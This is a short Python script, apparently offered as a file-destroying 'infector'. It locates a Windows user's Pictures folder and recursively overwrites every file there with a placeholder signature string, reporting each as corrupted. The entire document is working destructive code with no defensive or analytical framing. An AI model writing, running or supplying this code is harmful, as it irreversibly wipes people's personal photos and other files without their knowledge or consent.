import os

SINGATURE = "ENTER HERE ANYTHING :)"
images_for_infect = []
loop_count = 0
pictures_path = ""
pictures_accessed = False

def changing_directory_for_access_users_image():
    global pictures_path
    global pictures_accessed
    try:
        os.chdir('C:\\Users')
    except OSError:
        print("Path not found.")
    except PermissionError:
        print("Permission denied.")
        quit()
    else:
        non_discovered_user_files = []
        try:
            with os.scandir() as entries:
                for entry in entries:
                    if entry.is_dir() and not entry.name.startswith(".") and entry.name not in ["All Users", "Default", "Default User", "desktop.ini", "Public"]:
                        non_discovered_user_files.append(entry.name)
            print(non_discovered_user_files)
        except PermissionError:
            print("Access denied when accessing user dirs.")
        for user_file in non_discovered_user_files:
            try:
                os.chdir(f"C:\\Users\\{user_file}")
                dirs = os.listdir()
                print("Finding pictures dir...")
                if "Pictures" in dirs:
                    pictures_accessed = True
                    os.chdir(f"C:\\Users\\{user_file}\\Pictures")
                    pictures_path = f"C:\\Users\\{user_file}\\Pictures"
                    print("Accessed images.")
                    images_for_infect.append(tuple(os.listdir()))
                    break
                else:
                    print("Skipping...")
            except PermissionError:
                print("Access denied. Skipping...")
                
def infect_dirs(dir_path, to_path):
    os.chdir(f"{dir_path}\\{to_path}")
    dirs_for_infect = []
    with os.scandir() as entries:
        for entry in entries:
            if entry.is_dir():
                dirs_for_infect.append(entry.name)
            elif entry.name == 'desktop.ini':
                continue
            else:
                try:
                    with open(entry.name, 'w') as image_file:
                        if image_file.writable():
                            image_file.write(SINGATURE)
                            print("Corrupted file successfully.")
                        else:
                            print("This file is not writable. Skipping...")
                except PermissionError:
                    print("Permission denied. Skipping...")
        
    while dirs_for_infect:
        print("Accessing alt dirs...")
        next_dir = dirs_for_infect.pop(0)
        infect_dirs(os.getcwd(), next_dir)

def infecting_images():
    for images_per_user in images_for_infect:
        for images_and_dirs in images_per_user:
            if '.' in images_and_dirs:
                try:
                    with open(images_and_dirs, 'w') as image_file:
                        if image_file.writable():
                            image_file.write(SINGATURE)
                            print("Corrupted file successfully.")
                        else:
                            print("This file is not writable. Skipping...")
                except PermissionError:
                    print("Access denied. Skipping...")
                    continue
            else:
                infect_dirs(pictures_path, images_and_dirs)

changing_directory_for_access_users_image()

if (pictures_accessed):
    infecting_images()
